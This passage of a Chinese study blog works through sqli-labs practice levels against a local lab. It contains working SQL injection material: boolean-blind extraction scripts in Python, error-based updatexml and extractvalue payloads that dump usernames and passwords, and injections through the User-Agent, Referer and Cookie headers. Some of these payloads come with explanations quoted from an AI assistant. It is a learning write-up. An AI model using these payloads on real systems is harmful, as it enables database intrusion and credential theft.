判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">(database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">substr(</span><br><span class="hljs-string">(database())</span><br><span class="hljs-string">,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure><p>可以换database()来实现其它注入,less13用单引号，less14用双引号<br>脚本出处：<a href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a></p><h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>换了闭合点，可以按less13的方式解：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;password=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span> #&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure><h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>没有报错回显，无法用报错注入，只能用布尔盲注<br>闭合点：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or true#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><hr><h2 id="title-note-09date-2025-03-09-02-27-08tags-sql-labs"><a href="#title-note-09date-2025-03-09-02-27-08tags-sql-labs" class="headerlink" title="title: note-09date: 2025-03-09 02:27:08tags: sql-labs"></a>title: note-09<br>date: 2025-03-09 02:27:08<br>tags: sql-labs</h2><h1 id="sql-labs-less16"><a href="#sql-labs-less16" class="headerlink" title="sql-labs-less16"></a>sql-labs-less16</h1><p>先找一下注入点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) or true#&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>尝试报错注入，无果<br>进行盲注<br>改一下less14的脚本来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-16/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or length(</span><br><span class="hljs-string">(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or ascii(</span><br><span class="hljs-string">substr(</span><br><span class="hljs-string">(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;l&#125;,1)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a“ or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br><br></code></pre></td></tr></table></figure><p>by：<a href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a><br>只用改payload中的，两个都要改不然字长对不上  </p><h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>输入正确的账户和密码：admin，admin<br>提示密码已更新<br>看来页面是能对原有用户密码进行修改<br>在less1确认了猜测是正确的。<br>没想法了去查博客，<br>查看页面源码，是对username做了过滤，会先检查库里是否有对应username<br>只能从password注入</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br>或者<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>回显  </p><blockquote><p>You can’t specify target table ‘users’ for update in FROM clause  </p></blockquote><p>看来是不能直接爆表  </p><blockquote><p>原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。</p></blockquote><p>此payload创建了新的临时表x来避免对正在更新的users表进行直接查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">123456</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select * from(select concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users limit 0,1)x)))#</span><br></code></pre></td></tr></table></figure><p>KIMI:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR (updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#  </span><br><span class="hljs-string">```  </span><br><span class="hljs-string">updatxml()</span><br><span class="hljs-string">```sql</span><br><span class="hljs-string">updatexml(1, concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;, data), 1)  </span><br><span class="hljs-string">如果data是一个查询结果，那么当updatexml()函数执行时，会因为xpath_expr不符合要求而报错，</span><br><span class="hljs-string">错误信息中会包含data的内容。  </span><br></code></pre></td></tr></table></figure><p>数据查询部分：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, username, password) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>功能：  </p><blockquote><p>SELECT username, password FROM users：从users表中查询username和password字段。<br>(……)text：这是一个派生表（子查询的结果被当作一个临时表），命名为text。派生表的作用是绕过某些SQL注入场景中对直接查询表的限制。<br>concat_ws(‘:’, username, password)：将username和password字段用冒号（:）拼接成一个字符串，例如admin:password123。<br>LIMIT 0,1：限制查询结果只返回第一行数据。<br>作用：<br>从users表中提取用户名和密码，并将它们拼接成一个字符串，作为updatexml()函数的第二个参数。  </p></blockquote><p>执行过程：  </p><blockquote><p>闭合原语句并注入逻辑： OR操作使得注入的语句能够被执行。<br>查询数据： 从users表中提取用户名和密码，并拼接成一个字符串。<br>触发报错： 将拼接后的字符串作为updatexml()的第二个参数，触发报错。<br>泄露数据： 报错信息中会包含拼接后的字符串，从而泄露用户名和密码。<br>返回结果：<br>当这个注入语句执行时，MySQL会返回一个错误信息，类似如下：<br>XPATH syntax error: ‘!admin:password123’<br>从这个错误信息中，我们可以提取出admin:password123，从而获取到用户名和密码。</p></blockquote><h2 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h2><p>不想看了，反正先知道有这个group by报错注入</p><h2 id="函数说明-错误说明"><a href="#函数说明-错误说明" class="headerlink" title="函数说明,错误说明"></a>函数说明,错误说明</h2><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><p>语法：concat_ws(separator, str1, str2, …, strN)<br>功能：将两个或多个字符串用指定的分隔符连接起来，返回连接后的字符串。<br>特点：<br>第一个参数是分隔符，后续参数是要连接的字符串。<br>如果分隔符为 NULL，则结果为 NULL。<br>如果某个字符串为 NULL，则在连接时会跳过该字符串。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;邮箱&#x27;</span>);<br><span class="hljs-comment">-- 结果：用户名:密码:邮箱</span><br></code></pre></td></tr></table></figure><h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><blockquote><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# </p></blockquote><p>回显  </p><blockquote><p>Incorrect parameter count in the call to native function ‘extractvalue’</p></blockquote><p>KIMI：<br>出现这个错误是因为extractvalue()函数的参数数量不正确。extractvalue()函数在mysql中用于从xml数据中提取值，它的语法是：  </p><blockquote><p>extractvalue(xml_target, xpath_expression)  </p></blockquote><p>它只接受两个参数：<br>xml_target：要从中提取值的xml数据。<br>xpath_expression：用于定位xml数据中特定节点的xpath表达式。<br>而在你的payload中：  </p><blockquote><p>extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)  </p></blockquote><p>你传递了三个参数给extractvalue()函数，这显然不符合它的定义，因此mysql会报错，提示参数数量不正确。<br>正确的用法示例<br>如果你想使用extractvalue()函数来进行sql注入并获取数据，可以参考以下payload：  </p><blockquote><p>1’ and extractvalue(1, concat(0x7e,(select group_concat(id,username,password) from users),0x7e))#  </p></blockquote><p>这里只传递了两个参数给extractvalue()函数，符合它的定义，因此不会出现参数数量错误的问题。</p><h3 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">(... ...)word<br>(<span class="hljs-selector-tag">SELECT</span> username, password <span class="hljs-selector-tag">FROM</span> users)<span class="hljs-selector-tag">text</span> #为派生表<span class="hljs-selector-tag">text</span><br></code></pre></td></tr></table></figure><hr><h2 id="title-note-10date-2025-03-10-21-45-47tags-sql-labs"><a href="#title-note-10date-2025-03-10-21-45-47tags-sql-labs" class="headerlink" title="title: note-10date: 2025-03-10 21:45:47tags: sql-labs"></a>title: note-10<br>date: 2025-03-10 21:45:47<br>tags: sql-labs</h2><h1 id="less18-可能是叫做报头注入"><a href="#less18-可能是叫做报头注入" class="headerlink" title="less18 可能是叫做报头注入"></a>less18 可能是叫做报头注入</h1><p>在有头部回显的状况下用  </p><p>如图payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#<br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/1.png" alt="1">  </p><p>因为源码里有检查三个参数，所以要输入三个参数，或者用</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br>```  <br>闭合，此时后端代码就会变成<br>```sql<br>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure><p>前后两端的’是为了闭合原有的单引号中间用and，or等连接即可。</p><blockquote><p>闭合单引号：通过’闭合原SQL语句中的单引号，确保语法正确。  </p></blockquote><blockquote><p>使用or：or用于确保即使原语句的条件不成立，我们的注入语句仍然会被执行。  </p></blockquote><blockquote><p>注入extractvalue()：extractvalue()函数被用来触发报错，concat(0x7e,database())将数据库名称与一个波浪号（0x7e是波浪号的十六进制表示）拼接，从而在报错信息中回显出数据库名称。  </p></blockquote><blockquote><p>闭合表达式：通过or ‘’闭合整个表达式，确保语法正确。  </p></blockquote><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/2.png" alt="2">  </p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>为什么要用 or 或 and 连接:</p><p>因为使用了报错注入，所以需要使用or或and来闭合原语句并插入的注入语句。</p><h1 id="less19-头部注入-Referer"><a href="#less19-头部注入-Referer" class="headerlink" title="less19 头部注入-Referer"></a>less19 头部注入-Referer</h1><p>后端可以注入的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>相比上一关只有两个参数，所以可以这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(databass())),1),2)#  //爆数据库<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;)),1),2)#  //爆表名<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1)),1),2)#   <br>//分段回显<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(id,username,&#x27;!&#x27;,password)from users limit 0,1)),1),2)#<br>//最后一行行爆<br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/3.png" alt="3"><br>也可以这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure><h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>题目提示cookie注入，登录正确的账户名出现以下界面<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/4.png" alt="4"><br>表头如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-20/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=admin<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>cookie只有一个unmae？<br>尝试在uname注入<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/5.png" alt="5">  </p><p>发现注入点</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Cookie: uname=&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><p>可能是该后端代码造成了注入</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/6.png" alt="6">  </p><hr><h2 id="title-note-11date-2025-03-12-16-19-54tags-sql-labs"><a href="#title-note-11date-2025-03-12-16-19-54tags-sql-labs" class="headerlink" title="title: note-11date: 2025-03-12 16:19:54tags: sql-labs"></a>title: note-11<br>date: 2025-03-12 16:19:54<br>tags: sql-labs</h2><h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>根据题目提示先登正确账户密码吗，然后bp抓包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-21/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span 